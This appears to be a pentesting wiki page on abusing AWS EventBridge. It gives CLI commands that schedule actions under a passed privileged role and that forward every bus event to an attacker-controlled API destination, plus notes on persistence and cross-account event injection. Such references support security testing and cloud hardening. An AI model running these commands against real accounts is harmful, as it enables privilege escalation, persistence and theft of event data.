---
title: "EventBridge: triggering actions under a target role"
description: "Abusing EventBridge rules, buses, and targets to trigger actions or exfiltrate events under a privileged role."
keywords:
  - EventBridge
  - rule
  - event bus
  - target
  - role
---

# EventBridge

EventBridge routes events from buses to **targets** (Lambda, Step Functions, SNS, API destinations, and other services), and a target can carry a `RoleArn` that the delivery runs under. With `events:PutRule` and `events:PutTargets` (plus `iam:PassRole`) an attacker schedules or triggers actions as a passed role, adds a target that forwards every event on a bus to an attacker-controlled API destination for exfiltration, or modifies a cross-account bus policy to inject events.

## Scheduling an action under a passed role

```bash
aws events put-rule --name x --schedule-expression 'rate(5 minutes)'
aws events put-targets --rule x --targets \
  'Id=1,Arn=<target-arn>,RoleArn=arn:aws:iam::<acct>:role/<privileged-role>,Input="{}"'
```

## Exfiltrating a bus to an API destination

```bash
aws events put-rule --name exfil --event-pattern '{"source":[{"prefix":""}]}'
aws events put-targets --rule exfil --targets \
  'Id=1,Arn=<api-destination-arn>,RoleArn=<role>'
```

## Exploitation notes

- A rule with a broad `--event-pattern` matches nearly every event on the bus, so a forwarding target becomes a durable event-exfiltration channel.
- Targets with `RoleArn` require `iam:PassRole`, so this is a PassRole path and a persistence mechanism (the rule keeps firing on schedule).
- A permissive bus resource policy allows `events:PutEvents` from another account, which injects events to trigger downstream automations.

## Tools

- **AWS CLI** (`events put-rule`, `put-targets`, `put-permission`): rules, targets, and bus policy.

## References

- [AWS: EventBridge rule targets](https://docs.aws.amazon.com/eventbridge/latest/userguide/eb-targets.html)
- [HackTricks Cloud: AWS EventBridge](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
